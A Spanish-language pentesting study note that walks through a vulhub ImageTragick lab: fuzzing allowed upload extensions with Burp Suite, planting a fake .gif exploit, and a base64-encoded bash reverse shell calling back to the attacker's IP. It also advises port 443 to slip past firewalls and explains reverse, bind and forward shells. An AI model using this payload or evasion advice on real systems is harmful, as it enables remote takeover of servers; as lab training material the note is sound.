Para estar trabajando de un directorio a otro usaremos *pushd - popd*:
![[Pasted image 20240916183740.png]]
Creamos un archivo txt de prueba para ver como funciona imagetragick:
![[Pasted image 20240916183907.png]]

![[Pasted image 20240916183950.png]]

No le gustan los archivos .txt:
![[Pasted image 20240916184035.png]]

Para ver que extensiones le gustan habrá que hacer *fuzzing*, vfuzz, gobuster, burpsuite. En este ejemplo con *burpusuite*:
```bash
burpsuite &> /dev/null & disown
```

![[Pasted image 20240916190926.png]]

![[Pasted image 20240916191831.png]]

En la extensión FoxyProxy:
![[Pasted image 20240916191106.png]]

![[Pasted image 20240916191500.png]]

![[Pasted image 20240916191622.png]]

Si volvemos a cargar el arcivo texto.txt:
![[Pasted image 20240916192102.png]]

Estaremos interceptando con Burpsuite:
![[Pasted image 20240916192220.png]]

*-> CTRL+R => Para mandar al repeater*
![[Pasted image 20240916193422.png]]

*-> CTRL+I => Para mandar al intruder*
Primero seleccionaremos el payload:
![[Pasted image 20240916193823.png]]

Luego crearemos un diccionario para ataque de fuerza bruta:
![[Pasted image 20240916194247.png]]

Ahora en Settings buscaremos grep - extra ,para que nos filtre por respuesta (las que sean diferentes a la de .txt serán de interes):

![[Pasted image 20240916194638.png]]

![[Pasted image 20240916194517.png]]

![[Pasted image 20240916194718.png]]

![[Pasted image 20240916200140.png]]

Volviendo al repositorio de vulhub, copiaremos el exploit y al cargar como contenido un scrpipt que supuestamente es gif (una de las extensiones permitidas):
![[Pasted image 20240916204235.png]]

![[Pasted image 20240916204310.png]]

*Ojo!* Tenemos capacidad de ejecutar remotamente comandos -> podriamos conseguir acceso a la máquina:
Copiaremos el POC del repositorio:
```bash
nvim file.gif
```
![[Pasted image 20240916204722.png]]

Para ver que tiene esa cadena (echo al final para que no se muestre simbolo de salto de linea):
![[Pasted image 20240916205103.png]]
Una bash interactiva.

*Para utilizarla y ponerla en escucha en nuestro localhost, cambiaremos la cadenita con nuestra ip*
*OJO!* acordarse de quitar el salto de linea porque alterará la cadena en base64:
![[Pasted image 20240918192522.png]]
En este ejemplo lo hacemos por el puerto 4646, por buena práctica se suele hacer por el 443 (tráfico https-> más complicado que lo detecte el firewall). El parámetro -n ,es para que no haya salto de línea. Si no el base64 variaría.

copiaremos la cadenita:
```
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDY0NiAwPiYx
```

Volvemos a editar el fichero file.gif con la cadena nueva (que sería nuestra ip y el puerto que tenemos asignado):
![[Pasted image 20240918193055.png]]

-> Desde la máquina local y puerto que hemos configurado en file.gif:
![[Pasted image 20240918193749.png]]

-> De imagemagick, al colgar el archivo con el codigo de reverse shell:
![[Pasted image 20240918194057.png]]

-> En la máquina local ya habremos tomado el control:
![[Pasted image 20240918194202.png]]


*--------------------------------------------------------*
**Conceptos básicos de enumeración y explotación**
*--------------------------------------------------------*
- **Reverse Shell**: Es una técnica que permite a un atacante conectarse a una máquina remota desde una máquina de su propiedad. Es decir, se establece una conexión desde la máquina comprometida hacia la máquina del atacante. Esto se logra ejecutando un programa malicioso o una instrucción específica en la máquina remota que establece la conexión de vuelta hacia la máquina del atacante, permitiéndole tomar el control de la máquina remota.
- **Bind Shell**: Esta técnica es el opuesto de la Reverse Shell, ya que en lugar de que la máquina comprometida se conecte a la máquina del atacante, es el atacante quien se conecta a la máquina comprometida. El atacante escucha en un puerto determinado y la máquina comprometida acepta la conexión entrante en ese puerto. El atacante luego tiene acceso por consola a la máquina comprometida, lo que le permite tomar el control de la misma.
- **Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.

Es importante entender las diferencias entre estas técnicas para poder determinar cuál es la mejor opción en función del escenario de ataque y las limitaciones de la red.

*Propietario del servicio -> www-data
Servicio html -> apache2 por puerto :80*

*Reverse Shell*
![[Pasted image 20240918202027.png]]

*Bind Shell*: la máquina remota es la que pone la consola interactiva y la local se conecta (al revés que una reverse shell)
![[Pasted image 20240918202318.png]]

*Forward Shell* : aquí entra el papel del firewall (podemos crear reglas) -> aquí el firewall tendra reglas con iptable. Jugaremos con named pipes (mkfifo). Para burlar el firewall














